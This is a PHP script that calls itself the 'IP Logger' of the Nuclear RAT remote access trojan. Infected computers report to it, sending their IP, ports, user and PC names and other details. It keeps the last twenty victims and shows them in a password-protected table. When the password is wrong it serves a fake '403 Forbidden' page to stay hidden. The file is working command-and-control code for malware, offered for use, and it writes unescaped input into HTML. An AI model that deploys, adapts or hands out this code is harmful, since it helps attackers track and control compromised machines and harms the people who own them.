<?php
	/* 
	Put this on a PHP supported host, so you
	can receive online notifications of NR servers
	Most of hosts that support CGI (that have the
	cgi-bin folder) might support PHP aswell.

	Remember to CHMOD the file that will you upload as 646 ($ctrl_file)
      If that doesn't work, CHMOD to 777.

	>>> This IP Logger is part of Nuclear RAT <<<

	Thanks to HaTcHeT for showing how to do it too

	If you set a password, you need to auth before
	viewing the log, and you do it like

	http://yourhost.com/logger.php?pass=yourpasswordhere
	*/

	/************ Begin of editable part ************/
	/* This password is necessary for viewing the log (Leave as "" for no usage) */
	$view_pass = "abc123";   
	/* This setting specifies the max logged IPs should be stored */
	$length = 20;             
	/* Go to your FTP folder and create this file in the same folder as this script. You can also specify another folder for this file, such as "the_logged_info/IPs.txt" */
	$ctrl_file = "ips.txt";  
	/*************** End of editable part **********/
	
	if ($_GET["action"])
		$action = $_GET["action"];

	$datatime = date("H:i:s m/d/y");

	if ($action == "log"){
                echo "FUCK";     
		$daip = $_GET["ip"]."/".$_SERVER["REMOTE_ADDR"];
 		
		$n_file_arry = array();

		$type = $_GET["type"];  
		$host = $_GET["host"]; 
		$port = $_GET["port"]; 
		$name = $_GET["name"]; 
		$pc   = $_GET["pc"];   
		$user = $_GET["user"];
            	$version = "?";

		if ($_GET["version"])
			$version = $_GET["version"]; 
		
		$n_file_arry[0] = "<tr><td>$datatime</td><td>$user</td><td>$pc</td><td>$name</td><td>$daip</td><td>$port</td><td>$host</td><td>$type</td><td>$version</td></tr>\r\n";
  
		$file_arry = @file($ctrl_file);

		$counter = 0;
		
		while (list($key,$val) = each($file_arry)) {
			if ($val != ""){
				if ($key == $length-1) break;
				$val = str_replace(array("\r\n","\n","\r"), "", $val);
				$n_file_arry[$key+1] = $val."\r\n";
			}
		}

		$fp = @fopen("$ctrl_file", "w");
		@fputs($fp, join("", $n_file_arry));
		@fclose($fp);
		exit;
	} else {
		if ($view_pass != ""){
			$pass = $_GET["pass"];
			if ($pass != $view_pass){
?>
				<html>
					<head>
						<title>403 Forbidden</title>
					</head>
					<body>
						<h1>403 Forbidden</h1>
						<hr>
						<font size="3">You are not authorized to view this page</font>
					</body>
				</html>
<?php
				exit;
			}
		}

		if (!file_exists($ctrl_file)) {
			$datatime .= "<br><br><font color=\"#DD0000\">\"WARNING: '$ctrl_file' not found! Please manually create one in the same folder as this script and CHMOD to 646 or 777\"";
			$fp = @fopen($ctrl_file, "w");
			if (!$fp) { $datatime .= "<br>Tried to create '$ctrl_file' but couldnt"; }  else { fclose($fp); }
			$datatime .= "</font>";
		} else {
			if (!is_writable($ctrl_file)) $datatime .= "<br><br><font color=\"#DD0000\">\"'$ctrl_file' cant be opened for writing, please CHMOD it to 646 or 777\"";
		}	
	}
?>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Nuclear RAT IP Logger</title>
  </head>
  <style>
  <!--
    table {
          font-size: 10pt;
          background-color: #BFBFBF;
          padding: 5px;
          margin: 0px auto;
          align: center;
          }
    td {
         background-color: #E5E5E5;
         color: #1A1A1A;
         text-align: center;
         padding: 6px;
       }
    body {
         font-size: 10pt;
         font-family: verdana;
         color: #999999;
         background-color: #E5E5E5;
         margin: 3px;
     }
    .hand {text-decoration: none; cursor:hand}
    a {color: #999999}
  -->
  </style>
  <body>
    <div align="center">
      <p><h2>Nuclear RAT IP Logger</h2></p>
      <?php echo "Current Server Time: $datatime"; ?><br><br>
      <table border="0">
        <tr>
          <td><strong>Logged Time</strong></td>
          <td><strong>User Name</strong></td>
          <td><strong>PC Name</strong></td>
          <td><strong>Assigned Name</strong></td>
          <td><strong>Remote Address</strong></td>
          <td><strong>Remote Ports (Reverse/Direct)</strong></td>
          <td><strong>Password</strong></td>
          <td><strong>Type</strong></td>
          <td><strong>Version</strong></td>
        </tr>
        <?php
	   @readFile($ctrl_file); 
        ?>
      </table>
      <br>
      <a class="hand" href="http://www.nuclearwintercrew.com" target="_new"><b>Nuclear Winter Crew 2007</b></a>
    </div>
  </body>
</html>